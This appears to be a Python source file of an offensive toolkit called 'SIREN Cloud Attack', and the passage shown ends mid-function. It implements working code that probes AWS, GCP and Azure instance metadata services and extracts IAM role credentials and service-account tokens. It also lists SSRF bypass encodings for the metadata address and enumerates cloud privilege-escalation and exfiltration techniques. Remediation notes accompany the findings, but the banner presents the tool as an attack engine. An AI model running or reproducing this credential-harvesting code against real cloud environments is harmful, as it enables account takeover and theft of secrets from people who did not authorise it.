#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  ☁️  SIREN CLOUD ATTACK — Multi-Cloud Offensive Operations Engine  ☁️       ██
██                                                                                ██
██  Motor ofensivo completo para ambientes cloud multi-provider.                 ██
██                                                                                ██
██  Capacidades:                                                                  ██
██    • Metadata service exploitation — IMDS v1/v2, GCP, Azure                  ██
██    • S3/GCS/Blob bucket scanning — public access, misconfigs                  ██
██    • AWS IAM privilege escalation — 20+ privesc paths automated              ██
██    • Lambda/Cloud Functions env extraction — secrets in runtime               ██
██    • STS assume-role chain analysis — cross-account pivoting                  ██
██    • EC2/VM userdata secrets harvesting — startup script leaks                ██
██    • GCP service account impersonation — token chain escalation               ██
██    • Azure Managed Identity abuse — IMDS to Key Vault pivoting               ██
██    • IAM policy analysis — overprivileged roles & trust chains                ██
██    • Cloud credential harvesting — env vars, config files, tokens             ██
██    • Privilege escalation chain synthesis — multi-step attack paths            ██
██    • Cross-cloud lateral movement — hybrid environment pivoting               ██
██                                                                                ██
██  "SIREN nao pede permissao a nuvem — ela toma."                              ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import re
import socket
import struct
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

logger = logging.getLogger("siren.arsenal.cloud_attack")


# ════════════════════════════════════════════════════════════════════════════════
# ENUMS
# ════════════════════════════════════════════════════════════════════════════════

class CloudProvider(Enum):
    """Supported cloud providers."""
    AWS = auto()
    GCP = auto()
    AZURE = auto()
    DIGITAL_OCEAN = auto()
    ORACLE_CLOUD = auto()
    ALIBABA_CLOUD = auto()
    IBM_CLOUD = auto()
    UNKNOWN = auto()


class AttackCategory(Enum):
    """Categories of cloud attack techniques."""
    METADATA_EXPLOITATION = auto()
    STORAGE_ENUMERATION = auto()
    IAM_PRIVILEGE_ESCALATION = auto()
    CREDENTIAL_HARVESTING = auto()
    LATERAL_MOVEMENT = auto()
    DATA_EXFILTRATION = auto()
    PERSISTENCE = auto()
    DEFENSE_EVASION = auto()
    RESOURCE_HIJACKING = auto()
    SECRETS_EXTRACTION = auto()
    SERVERLESS_ABUSE = auto()
    IDENTITY_IMPERSONATION = auto()
    CROSS_ACCOUNT_PIVOT = auto()
    KEY_VAULT_ACCESS = auto()
    NETWORK_EXPLOITATION = auto()


class PrivEscTechnique(Enum):
    """Known privilege escalation techniques across cloud providers."""
    # AWS IAM PrivEsc techniques
    AWS_CREATE_POLICY_VERSION = auto()
    AWS_SET_DEFAULT_POLICY_VERSION = auto()
    AWS_CREATE_ACCESS_KEY = auto()
    AWS_CREATE_LOGIN_PROFILE = auto()
    AWS_UPDATE_LOGIN_PROFILE = auto()
    AWS_ATTACH_USER_POLICY = auto()
    AWS_ATTACH_GROUP_POLICY = auto()
    AWS_ATTACH_ROLE_POLICY = auto()
    AWS_PUT_USER_POLICY = auto()
    AWS_PUT_GROUP_POLICY = auto()
    AWS_PUT_ROLE_POLICY = auto()
    AWS_ADD_USER_TO_GROUP = auto()
    AWS_UPDATE_ASSUME_ROLE_POLICY = auto()
    AWS_PASS_ROLE_LAMBDA = auto()
    AWS_PASS_ROLE_EC2 = auto()
    AWS_PASS_ROLE_CLOUDFORMATION = auto()
    AWS_PASS_ROLE_DATAPIPELINE = auto()
    AWS_PASS_ROLE_GLUE = auto()
    AWS_LAMBDA_INVOKE = auto()
    AWS_LAMBDA_CREATE_FUNCTION = auto()
    AWS_LAMBDA_UPDATE_CODE = auto()
    AWS_EC2_SSRF_METADATA = auto()
    AWS_STS_ASSUME_ROLE = auto()
    AWS_STS_GET_SESSION_TOKEN = auto()
    AWS_SSM_SEND_COMMAND = auto()
    AWS_SSM_START_SESSION = auto()
    AWS_CODESTAR_CREATE_PROJECT = auto()
    AWS_COGNITO_SET_ATTRIBUTES = auto()
    # GCP PrivEsc techniques
    GCP_SA_IMPERSONATE = auto()
    GCP_SA_KEY_CREATE = auto()
    GCP_SA_TOKEN_CREATOR = auto()
    GCP_CLOUDFUNC_DEPLOY = auto()
    GCP_COMPUTE_SSH = auto()
    GCP_COMPUTE_STARTUP_SCRIPT = auto()
    GCP_SET_IAM_POLICY = auto()
    GCP_STORAGE_HMAC_KEY = auto()
    GCP_ORGPOLICY_SET = auto()
    GCP_DEPLOYMENTMGR_CREATE = auto()
    # Azure PrivEsc techniques
    AZURE_MANAGED_IDENTITY = auto()
    AZURE_ROLE_ASSIGNMENT = auto()
    AZURE_KEYVAULT_ACCESS = auto()
    AZURE_AUTOMATION_RUNBOOK = auto()
    AZURE_VM_RUN_COMMAND = auto()
    AZURE_LOGIC_APP = auto()
    AZURE_FUNCTION_APP = auto()
    AZURE_APP_REG_SECRET = auto()
    AZURE_CUSTOM_ROLE = auto()
    AZURE_STORAGE_SAS = auto()


class MetadataVersion(Enum):
    """IMDS metadata service versions."""
    IMDS_V1 = auto()
    IMDS_V2 = auto()
    GCP_V1 = auto()
    GCP_BETA = auto()
    AZURE_2019 = auto()
    AZURE_2021 = auto()


class StoragePermission(Enum):
    """Cloud storage permission levels."""
    PUBLIC_READ = auto()
    PUBLIC_WRITE = auto()
    PUBLIC_LIST = auto()
    AUTHENTICATED_READ = auto()
    AUTHENTICATED_WRITE = auto()
    PRIVATE = auto()
    UNKNOWN = auto()


class CredentialType(Enum):
    """Types of cloud credentials."""
    ACCESS_KEY = auto()
    SECRET_KEY = auto()
    SESSION_TOKEN = auto()
    OAUTH_TOKEN = auto()
    SERVICE_ACCOUNT_KEY = auto()
    MANAGED_IDENTITY_TOKEN = auto()
    SAS_TOKEN = auto()
    API_KEY = auto()
    JWT_TOKEN = auto()
    REFRESH_TOKEN = auto()
    CERTIFICATE = auto()
    SSH_KEY = auto()
    CONNECTION_STRING = auto()


class Severity(Enum):
    """Finding severity levels."""
    CRITICAL = auto()
    HIGH = auto()
    MEDIUM = auto()
    LOW = auto()
    INFO = auto()


# ════════════════════════════════════════════════════════════════════════════════
# DATACLASSES
# ════════════════════════════════════════════════════════════════════════════════

@dataclass
class CloudCredential:
    """Represents a discovered cloud credential."""
    credential_id: str = ""
    provider: CloudProvider = CloudProvider.UNKNOWN
    credential_type: CredentialType = CredentialType.ACCESS_KEY
    principal: str = ""
    value: str = ""
    secret: str = ""
    token: str = ""
    region: str = ""
    account_id: str = ""
    project_id: str = ""
    subscription_id: str = ""
    expiration: float = 0.0
    source: str = ""
    is_valid: bool = False
    permissions: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    discovered_at: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "credential_id": self.credential_id,
            "provider": self.provider.name,
            "credential_type": self.credential_type.name,
            "principal": self.principal,
            "value": self.value[:8] + "****" if len(self.value) > 8 else "****",
            "region": self.region,
            "account_id": self.account_id,
            "project_id": self.project_id,
            "subscription_id": self.subscription_id,
            "expiration": self.expiration,
            "source": self.source,
            "is_valid": self.is_valid,
            "permissions": self.permissions,
            "metadata": self.metadata,
            "discovered_at": self.discovered_at,
        }


@dataclass
class CloudAsset:
    """Represents a discovered cloud asset (bucket, VM, function, etc.)."""
    asset_id: str = ""
    provider: CloudProvider = CloudProvider.UNKNOWN
    asset_type: str = ""
    name: str = ""
    region: str = ""
    account_id: str = ""
    arn: str = ""
    url: str = ""
    is_public: bool = False
    permissions: List[str] = field(default_factory=list)
    tags: Dict[str, str] = field(default_factory=dict)
    configuration: Dict[str, Any] = field(default_factory=dict)
    vulnerabilities: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    discovered_at: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "asset_id": self.asset_id,
            "provider": self.provider.name,
            "asset_type": self.asset_type,
            "name": self.name,
            "region": self.region,
            "account_id": self.account_id,
            "arn": self.arn,
            "url": self.url,
            "is_public": self.is_public,
            "permissions": self.permissions,
            "tags": self.tags,
            "configuration": self.configuration,
            "vulnerabilities": self.vulnerabilities,
            "metadata": self.metadata,
            "discovered_at": self.discovered_at,
        }


@dataclass
class CloudFinding:
    """Represents a security finding in a cloud environment."""
    finding_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    provider: CloudProvider = CloudProvider.UNKNOWN
    category: AttackCategory = AttackCategory.METADATA_EXPLOITATION
    severity: Severity = Severity.INFO
    title: str = ""
    description: str = ""
    affected_asset: str = ""
    affected_principal: str = ""
    technique: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)
    remediation: str = ""
    mitre_attack_id: str = ""
    references: List[str] = field(default_factory=list)
    credential: Optional[CloudCredential] = None
    is_exploitable: bool = False
    exploitation_steps: List[str] = field(default_factory=list)
    impact: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)
    discovered_at: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id": self.finding_id,
            "provider": self.provider.name,
            "category": self.category.name,
            "severity": self.severity.name,
            "title": self.title,
            "description": self.description,
            "affected_asset": self.affected_asset,
            "affected_principal": self.affected_principal,
            "technique": self.technique,
            "evidence": self.evidence,
            "remediation": self.remediation,
            "mitre_attack_id": self.mitre_attack_id,
            "references": self.references,
            "credential": self.credential.to_dict() if self.credential else None,
            "is_exploitable": self.is_exploitable,
            "exploitation_steps": self.exploitation_steps,
            "impact": self.impact,
            "metadata": self.metadata,
            "discovered_at": self.discovered_at,
        }


@dataclass
class CloudPrivEscPath:
    """Represents a privilege escalation path in cloud environment."""
    path_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    provider: CloudProvider = CloudProvider.UNKNOWN
    technique: PrivEscTechnique = PrivEscTechnique.AWS_CREATE_POLICY_VERSION
    source_principal: str = ""
    target_principal: str = ""
    required_permissions: List[str] = field(default_factory=list)
    current_permissions: List[str] = field(default_factory=list)
    steps: List[str] = field(default_factory=list)
    api_calls: List[Dict[str, Any]] = field(default_factory=list)
    success_probability: float = 0.0
    impact_level: Severity = Severity.HIGH
    is_feasible: bool = False
    prerequisites: List[str] = field(default_factory=list)
    detection_risk: str = "medium"
    mitre_technique: str = ""
    notes: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "path_id": self.path_id,
            "provider": self.provider.name,
            "technique": self.technique.name,
            "source_principal": self.source_principal,
            "target_principal": self.target_principal,
            "required_permissions": self.required_permissions,
            "current_permissions": self.current_permissions,
            "steps": self.steps,
            "api_calls": self.api_calls,
            "success_probability": self.success_probability,
            "impact_level": self.impact_level.name,
            "is_feasible": self.is_feasible,
            "prerequisites": self.prerequisites,
            "detection_risk": self.detection_risk,
            "mitre_technique": self.mitre_technique,
            "notes": self.notes,
            "metadata": self.metadata,
        }


@dataclass
class MetadataEndpoint:
    """Describes a cloud metadata service endpoint."""
    provider: CloudProvider = CloudProvider.UNKNOWN
    base_url: str = ""
    version: MetadataVersion = MetadataVersion.IMDS_V1
    headers: Dict[str, str] = field(default_factory=dict)
    token_endpoint: str = ""
    token_header: str = ""
    credential_paths: List[str] = field(default_factory=list)
    identity_paths: List[str] = field(default_factory=list)
    userdata_path: str = ""
    network_path: str = ""
    tags_path: str = ""
    is_accessible: bool = False
    requires_token: bool = False
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "provider": self.provider.name,
            "base_url": self.base_url,
            "version": self.version.name,
            "headers": self.headers,
            "token_endpoint": self.token_endpoint,
            "credential_paths": self.credential_paths,
            "identity_paths": self.identity_paths,
            "userdata_path": self.userdata_path,
            "is_accessible": self.is_accessible,
            "requires_token": self.requires_token,
            "metadata": self.metadata,
        }


@dataclass
class BucketFinding:
    """Represents a finding from bucket/storage scanning."""
    finding_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    provider: CloudProvider = CloudProvider.UNKNOWN
    bucket_name: str = ""
    bucket_url: str = ""
    region: str = ""
    permission: StoragePermission = StoragePermission.UNKNOWN
    is_public: bool = False
    allows_listing: bool = False
    allows_upload: bool = False
    sensitive_files: List[str] = field(default_factory=list)
    file_count: int = 0
    total_size_bytes: int = 0
    acl_details: Dict[str, Any] = field(default_factory=dict)
    policy_details: Dict[str, Any] = field(default_factory=dict)
    encryption_status: str = "unknown"
    versioning_enabled: bool = False
    logging_enabled: bool = False
    cors_config: Dict[str, Any] = field(default_factory=dict)
    severity: Severity = Severity.INFO
    metadata: Dict[str, Any] = field(default_factory=dict)
    discovered_at: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id": self.finding_id,
            "provider": self.provider.name,
            "bucket_name": self.bucket_name,
            "bucket_url": self.bucket_url,
            "region": self.region,
            "permission": self.permission.name,
            "is_public": self.is_public,
            "allows_listing": self.allows_listing,
            "allows_upload": self.allows_upload,
            "sensitive_files": self.sensitive_files,
            "file_count": self.file_count,
            "total_size_bytes": self.total_size_bytes,
            "acl_details": self.acl_details,
            "policy_details": self.policy_details,
            "encryption_status": self.encryption_status,
            "versioning_enabled": self.versioning_enabled,
            "logging_enabled": self.logging_enabled,
            "cors_config": self.cors_config,
            "severity": self.severity.name,
            "metadata": self.metadata,
            "discovered_at": self.discovered_at,
        }


# ════════════════════════════════════════════════════════════════════════════════
# METADATA EXPLOITER — AWS IMDS, GCP Metadata, Azure IMDS
# ════════════════════════════════════════════════════════════════════════════════

class MetadataExploiter:
    """
    Exploits cloud instance metadata services (IMDS) across AWS, GCP, and Azure.

    Supports:
        - AWS IMDS v1 (no token) and v2 (token-based)
        - GCP metadata server with Metadata-Flavor header
        - Azure IMDS with API version headers

    Usage:
        exploiter = MetadataExploiter()
        endpoints = exploiter.detect_metadata_services()
        creds = exploiter.extract_credentials(endpoints)
    """

    # AWS IMDS
    AWS_IMDS_BASE = "http://169.254.169.254"
    AWS_IMDS_V2_TOKEN_URL = "http://169.254.169.254/latest/api/token"
    AWS_IMDS_V2_TOKEN_TTL = "21600"
    AWS_METADATA_PATHS = [
        "/latest/meta-data/",
        "/latest/meta-data/ami-id",
        "/latest/meta-data/instance-id",
        "/latest/meta-data/instance-type",
        "/latest/meta-data/hostname",
        "/latest/meta-data/local-hostname",
        "/latest/meta-data/local-ipv4",
        "/latest/meta-data/public-hostname",
        "/latest/meta-data/public-ipv4",
        "/latest/meta-data/placement/availability-zone",
        "/latest/meta-data/placement/region",
        "/latest/meta-data/security-groups",
        "/latest/meta-data/network/interfaces/macs/",
        "/latest/meta-data/iam/info",
        "/latest/meta-data/iam/security-credentials/",
        "/latest/meta-data/identity-credentials/ec2/info",
        "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        "/latest/user-data",
        "/latest/dynamic/instance-identity/document",
    ]
    AWS_CREDENTIAL_PATH = "/latest/meta-data/iam/security-credentials/"

    # GCP Metadata
    GCP_METADATA_BASE = "http://metadata.google.internal"
    GCP_METADATA_HEADER = {"Metadata-Flavor": "Google"}
    GCP_METADATA_PATHS = [
        "/computeMetadata/v1/project/project-id",
        "/computeMetadata/v1/project/numeric-project-id",
        "/computeMetadata/v1/project/attributes/",
        "/computeMetadata/v1/instance/name",
        "/computeMetadata/v1/instance/id",
        "/computeMetadata/v1/instance/zone",
        "/computeMetadata/v1/instance/hostname",
        "/computeMetadata/v1/instance/machine-type",
        "/computeMetadata/v1/instance/network-interfaces/",
        "/computeMetadata/v1/instance/service-accounts/",
        "/computeMetadata/v1/instance/service-accounts/default/email",
        "/computeMetadata/v1/instance/service-accounts/default/token",
        "/computeMetadata/v1/instance/service-accounts/default/scopes",
        "/computeMetadata/v1/instance/attributes/",
        "/computeMetadata/v1/instance/attributes/startup-script",
        "/computeMetadata/v1/instance/attributes/ssh-keys",
        "/computeMetadata/v1/instance/attributes/kube-env",
    ]
    GCP_SA_TOKEN_PATH = "/computeMetadata/v1/instance/service-accounts/{sa}/token"

    # Azure IMDS
    AZURE_IMDS_BASE = "http://169.254.169.254"
    AZURE_IMDS_HEADER = {"Metadata": "true"}
    AZURE_API_VERSION = "2021-02-01"
    AZURE_METADATA_PATHS = [
        "/metadata/instance?api-version={ver}",
        "/metadata/instance/compute?api-version={ver}",
        "/metadata/instance/compute/name?api-version={ver}&format=text",
        "/metadata/instance/compute/resourceGroupName?api-version={ver}&format=text",
        "/metadata/instance/compute/subscriptionId?api-version={ver}&format=text",
        "/metadata/instance/compute/vmId?api-version={ver}&format=text",
        "/metadata/instance/compute/location?api-version={ver}&format=text",
        "/metadata/instance/network?api-version={ver}",
        "/metadata/instance/compute/userData?api-version={ver}&format=text",
        "/metadata/instance/compute/customData?api-version={ver}&format=text",
    ]
    AZURE_TOKEN_PATH = "/metadata/identity/oauth2/token?api-version={ver}&resource={res}"
    AZURE_RESOURCES = [
        "https://management.azure.com/",
        "https://vault.azure.net",
        "https://storage.azure.com/",
        "https://graph.microsoft.com/",
        "https://database.windows.net/",
    ]

    # SSRF bypass patterns for metadata access
    SSRF_BYPASS_URLS = [
        "http://169.254.169.254",
        "http://[::ffff:a9fe:a9fe]",
        "http://0xA9FEA9FE",
        "http://0251.0376.0251.0376",
        "http://2852039166",
        "http://169.254.169.254.xip.io",
        "http://metadata.google.internal",
        "http://169.254.169.254:80",
        "http://169.254.169.254:443",
    ]

    def __init__(self, timeout: float = 3.0, max_retries: int = 2) -> None:
        self._lock = threading.RLock()
        self._timeout = timeout
        self._max_retries = max_retries
        self._endpoints: List[MetadataEndpoint] = []
        self._credentials: List[CloudCredential] = []
        self._findings: List[CloudFinding] = []
        self._metadata_cache: Dict[str, str] = {}
        self._imds_v2_token: str = ""
        self._imds_v2_token_expiry: float = 0.0
        logger.info("MetadataExploiter initialized (timeout=%.1fs)", timeout)

    def _http_request(
        self,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        method: str = "GET",
        data: Optional[bytes] = None,
        timeout: Optional[float] = None,
    ) -> Tuple[int, str, Dict[str, str]]:
        """Execute an HTTP request and return (status_code, body, response_headers)."""
        _timeout = timeout or self._timeout
        req_headers = headers or {}
        try:
            req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
            with urllib.request.urlopen(req, timeout=_timeout) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                resp_headers = {k.lower(): v for k, v in resp.getheaders()}
                return resp.status, body, resp_headers
        except urllib.error.HTTPError as e:
            body = ""
            try:
                body = e.read().decode("utf-8", errors="replace")
            except Exception:
                pass
            return e.code, body, {}
        except (urllib.error.URLError, socket.timeout, OSError):
            return 0, "", {}
        except Exception as exc:
            logger.debug("HTTP request to %s failed: %s", url, exc)
            return 0, "", {}

    def _put_request(
        self, url: str, headers: Optional[Dict[str, str]] = None, timeout: Optional[float] = None
    ) -> Tuple[int, str, Dict[str, str]]:
        """Execute an HTTP PUT request."""
        return self._http_request(url, headers=headers, method="PUT", timeout=timeout)

    def detect_metadata_services(self) -> List[MetadataEndpoint]:
        """Detect which cloud metadata services are accessible."""
        with self._lock:
            self._endpoints.clear()
            logger.info("Probing cloud metadata services...")

            # Probe AWS IMDS
            aws_ep = self._probe_aws_imds()
            if aws_ep and aws_ep.is_accessible:
                self._endpoints.append(aws_ep)
                logger.info("AWS IMDS detected (version=%s)", aws_ep.version.name)

            # Probe GCP metadata
            gcp_ep = self._probe_gcp_metadata()
            if gcp_ep and gcp_ep.is_accessible:
                self._endpoints.append(gcp_ep)
                logger.info("GCP metadata server detected")

            # Probe Azure IMDS
            azure_ep = self._probe_azure_imds()
            if azure_ep and azure_ep.is_accessible:
                self._endpoints.append(azure_ep)
                logger.info("Azure IMDS detected")

            logger.info("Detected %d metadata services", len(self._endpoints))
            return list(self._endpoints)

    def _probe_aws_imds(self) -> Optional[MetadataEndpoint]:
        """Probe AWS Instance Metadata Service (v1 and v2)."""
        endpoint = MetadataEndpoint(
            provider=CloudProvider.AWS,
            base_url=self.AWS_IMDS_BASE,
            token_endpoint=self.AWS_IMDS_V2_TOKEN_URL,
            token_header="X-aws-ec2-metadata-token",
            credential_paths=[self.AWS_CREDENTIAL_PATH],
            identity_paths=["/latest/dynamic/instance-identity/document"],
            userdata_path="/latest/user-data",
            network_path="/latest/meta-data/network/interfaces/macs/",
            tags_path="/latest/meta-data/tags/instance/",
        )

        # Try IMDSv2 first (more secure, uses token)
        token = self._get_aws_imds_v2_token()
        if token:
            endpoint.version = MetadataVersion.IMDS_V2
            endpoint.requires_token = True
            endpoint.is_accessible = True
            endpoint.headers = {"X-aws-ec2-metadata-token": token}
            self._imds_v2_token = token
            self._imds_v2_token_expiry = time.time() + float(self.AWS_IMDS_V2_TOKEN_TTL)
            self._add_finding(
                provider=CloudProvider.AWS,
                category=AttackCategory.METADATA_EXPLOITATION,
                severity=Severity.MEDIUM,
                title="AWS IMDSv2 Accessible",
                description="Instance metadata service v2 is accessible. Token-based access enforced.",
                technique="IMDSv2 Token Exchange",
                remediation="Ensure hop limit is set to 1. Consider restricting IMDS access via iptables.",
                mitre_attack_id="T1552.005",
            )
            return endpoint

        # Fall back to IMDSv1 (no token, higher risk)
        status, body, _ = self._http_request(
            self.AWS_IMDS_BASE + "/latest/meta-data/", timeout=2.0
        )
        if status == 200 and body:
            endpoint.version = MetadataVersion.IMDS_V1
            endpoint.requires_token = False
            endpoint.is_accessible = True
            self._add_finding(
                provider=CloudProvider.AWS,
                category=AttackCategory.METADATA_EXPLOITATION,
                severity=Severity.CRITICAL,
                title="AWS IMDSv1 Accessible (No Token Required)",
                description=(
                    "Instance metadata service v1 is accessible WITHOUT token. "
                    "Any SSRF vulnerability can extract IAM credentials."
                ),
                technique="IMDSv1 Direct Access",
                is_exploitable=True,
                remediation=(
                    "Enforce IMDSv2 by setting HttpTokens=required. "
                    "Set HttpPutResponseHopLimit=1."
                ),
                mitre_attack_id="T1552.005",
            )
            return endpoint

        return None

    def _get_aws_imds_v2_token(self) -> str:
        """Obtain an AWS IMDSv2 session token."""
        if self._imds_v2_token and time.time() < self._imds_v2_token_expiry:
            return self._imds_v2_token
        headers = {"X-aws-ec2-metadata-token-ttl-seconds": self.AWS_IMDS_V2_TOKEN_TTL}
        status, body, _ = self._put_request(
            self.AWS_IMDS_V2_TOKEN_URL, headers=headers, timeout=2.0
        )
        if status == 200 and body:
            return body.strip()
        return ""

    def _probe_gcp_metadata(self) -> Optional[MetadataEndpoint]:
        """Probe Google Cloud metadata server."""
        endpoint = MetadataEndpoint(
            provider=CloudProvider.GCP,
            base_url=self.GCP_METADATA_BASE,
            version=MetadataVersion.GCP_V1,
            headers=dict(self.GCP_METADATA_HEADER),
            credential_paths=[
                "/computeMetadata/v1/instance/service-accounts/default/token",
            ],
            identity_paths=[
                "/computeMetadata/v1/instance/service-accounts/default/email",
            ],
            userdata_path="/computeMetadata/v1/instance/attributes/startup-script",
            network_path="/computeMetadata/v1/instance/network-interfaces/",
            tags_path="/computeMetadata/v1/instance/tags",
        )

        status, body, _ = self._http_request(
            self.GCP_METADATA_BASE + "/computeMetadata/v1/project/project-id",
            headers=self.GCP_METADATA_HEADER,
            timeout=2.0,
        )
        if status == 200 and body:
            endpoint.is_accessible = True
            endpoint.metadata["project_id"] = body.strip()
            self._add_finding(
                provider=CloudProvider.GCP,
                category=AttackCategory.METADATA_EXPLOITATION,
                severity=Severity.HIGH,
                title="GCP Metadata Server Accessible",
                description=(
                    f"GCP metadata server accessible. Project ID: {body.strip()}. "
                    "Service account tokens can be extracted."
                ),
                technique="GCP Metadata Query",
                is_exploitable=True,
                remediation="Block metadata server access from containers. Use Workload Identity.",
                mitre_attack_id="T1552.005",
            )
            return endpoint

        # Try without header (older / misconfigured)
        status2, body2, _ = self._http_request(
            self.GCP_METADATA_BASE + "/computeMetadata/v1/project/project-id",
            timeout=2.0,
        )
        if status2 == 200 and body2:
            endpoint.is_accessible = True
            endpoint.requires_token = False
            endpoint.metadata["project_id"] = body2.strip()
            endpoint.metadata["no_header_required"] = True
            self._add_finding(
                provider=CloudProvider.GCP,
                category=AttackCategory.METADATA_EXPLOITATION,
                severity=Severity.CRITICAL,
                title="GCP Metadata Accessible WITHOUT Metadata-Flavor Header",
                description=(
                    "GCP metadata server responds without Metadata-Flavor header. "
                    "SSRF attacks can trivially extract credentials."
                ),
                technique="GCP Metadata No-Header Bypass",
                is_exploitable=True,
                remediation="Ensure metadata concealment is enabled on GKE clusters.",
                mitre_attack_id="T1552.005",
            )
            return endpoint

        return None

    def _probe_azure_imds(self) -> Optional[MetadataEndpoint]:
        """Probe Azure Instance Metadata Service."""
        endpoint = MetadataEndpoint(
            provider=CloudProvider.AZURE,
            base_url=self.AZURE_IMDS_BASE,
            version=MetadataVersion.AZURE_2021,
            headers=dict(self.AZURE_IMDS_HEADER),
            credential_paths=[
                self.AZURE_TOKEN_PATH.format(
                    ver=self.AZURE_API_VERSION,
                    res="https://management.azure.com/",
                ),
            ],
            identity_paths=[
                "/metadata/instance/compute?api-version={}&format=json".format(
                    self.AZURE_API_VERSION
                ),
            ],
            userdata_path="/metadata/instance/compute/userData?api-version={}&format=text".format(
                self.AZURE_API_VERSION
            ),
            network_path="/metadata/instance/network?api-version={}&format=json".format(
                self.AZURE_API_VERSION
            ),
        )

        url = "{}/metadata/instance?api-version={}&format=json".format(
            self.AZURE_IMDS_BASE, self.AZURE_API_VERSION
        )
        status, body, _ = self._http_request(
            url, headers=self.AZURE_IMDS_HEADER, timeout=2.0
        )
        if status == 200 and body:
            endpoint.is_accessible = True
            try:
                data = json.loads(body)
                compute = data.get("compute", {})
                endpoint.metadata["vm_name"] = compute.get("name", "")
                endpoint.metadata["resource_group"] = compute.get("resourceGroupName", "")
                endpoint.metadata["subscription_id"] = compute.get("subscriptionId", "")
                endpoint.metadata["location"] = compute.get("location", "")
                endpoint.metadata["vm_size"] = compute.get("vmSize", "")
            except (json.JSONDecodeError, KeyError):
                pass

            self._add_finding(
                provider=CloudProvider.AZURE,
                category=AttackCategory.METADATA_EXPLOITATION,
                severity=Severity.HIGH,
                title="Azure IMDS Accessible",
                description=(
                    "Azure Instance Metadata Service is accessible. "
                    "Managed identity tokens can be obtained."
                ),
                technique="Azure IMDS Query",
                is_exploitable=True,
                remediation="Restrict IMDS access via NSG rules or firewall. Use User-Assigned identities.",
                mitre_attack_id="T1552.005",
            )
            return endpoint

        return None

    def extract_aws_credentials(self, endpoint: MetadataEndpoint) -> List[CloudCredential]:
        """Extract IAM role credentials from AWS IMDS."""
        with self._lock:
            creds: List[CloudCredential] = []
            headers = endpoint.headers if endpoint.requires_token else {}

            # Get IAM role name
            role_url = self.AWS_IMDS_BASE + self.AWS_CREDENTIAL_PATH
            status, body, _ = self._http_request(role_url, headers=headers)
            if status != 200 or not body:
                return creds

            for role_name in body.strip().split("\n"):
                role_name = role_name.strip()
                if not role_name:
                    continue

                cred_url = self.AWS_IMDS_BASE + self.AWS_CREDENTIAL_PATH + role_name
                st2, body2, _ = self._http_request(cred_url, headers=headers)
                if st2 != 200 or not body2:
                    continue

                try:
                    cred_data = json.loads(body2)
                    cred = CloudCredential(
                        credential_id=uuid.uuid4().hex[:16],
                        provider=CloudProvider.AWS,
                        credential_type=CredentialType.SESSION_TOKEN,
                        principal=role_name,
                        value=cred_data.get("AccessKeyId", ""),
                        secret=cred_data.get("SecretAccessKey", ""),
                        token=cred_data.get("Token", ""),
                        source="IMDS_" + endpoint.version.name,
                        is_valid=cred_data.get("Code") == "Success",
                        metadata={
                            "type": cred_data.get("Type", ""),
                            "last_updated": cred_data.get("LastUpdated", ""),
                            "expiration": cred_data.get("Expiration", ""),
                        },
                    )
                    creds.append(cred)
                    self._credentials.append(cred)
                    logger.info("Extracted AWS credentials for role: %s", role_name)

                    self._add_finding(
                        provider=CloudProvider.AWS,
                        category=AttackCategory.CREDENTIAL_HARVESTING,
                        severity=Severity.CRITICAL,
                        title=f"AWS IAM Credentials Extracted from IMDS ({role_name})",
                        description=(
                            f"Successfully extracted temporary credentials for IAM role "
                            f"'{role_name}' from the instance metadata service."
                        ),
                        technique="IMDS Credential Extraction",
                        is_exploitable=True,
                        credential=cred,
                        remediation="Enforce IMDSv2, set hop limit to 1, restrict IAM role permissions.",
                        mitre_attack_id="T1552.005",
                    )
                except (json.JSONDecodeError, KeyError) as e:
                    logger.warning("Failed to parse AWS credential response: %s", e)

            # Extract instance identity document
            id_url = self.AWS_IMDS_BASE + "/latest/dynamic/instance-identity/document"
            st3, body3, _ = self._http_request(id_url, headers=headers)
            if st3 == 200 and body3:
                try:
                    id_doc = json.loads(body3)
                    for c in creds:
                        c.account_id = id_doc.get("accountId", "")
                        c.region = id_doc.get("region", "")
                except (json.JSONDecodeError, KeyError):
                    pass

            return creds

    def extract_gcp_credentials(self, endpoint: MetadataEndpoint) -> List[CloudCredential]:
        """Extract service account tokens from GCP metadata server."""
        with self._lock:
            creds: List[CloudCredential] = []
            headers = endpoint.headers

            # List service accounts
            sa_url = self.GCP_METADATA_BASE + "/computeMetadata/v1/instance/service-accounts/"
            status, body, _ = self._http_request(sa_url, headers=headers)
            if status != 200 or not body:
                return creds

            service_accounts = [
                sa.strip().rstrip("/") for sa in body.strip().split("\n") if sa.strip()
            ]

            for sa in service_accounts:
                if not sa:
                    continue

                # Get email
                email_url = (
                    self.GCP_METADATA_BASE
                    + f"/computeMetadata/v1/instance/service-accounts/{sa}/email"
                )
                st_e, email, _ = self._http_request(email_url, headers=headers)
                sa_email = email.strip() if st_e == 200 else sa

                # Get access token
                token_url = (
                    self.GCP_METADATA_BASE
                    + f"/computeMetadata/v1/instance/service-accounts/{sa}/token"
                )
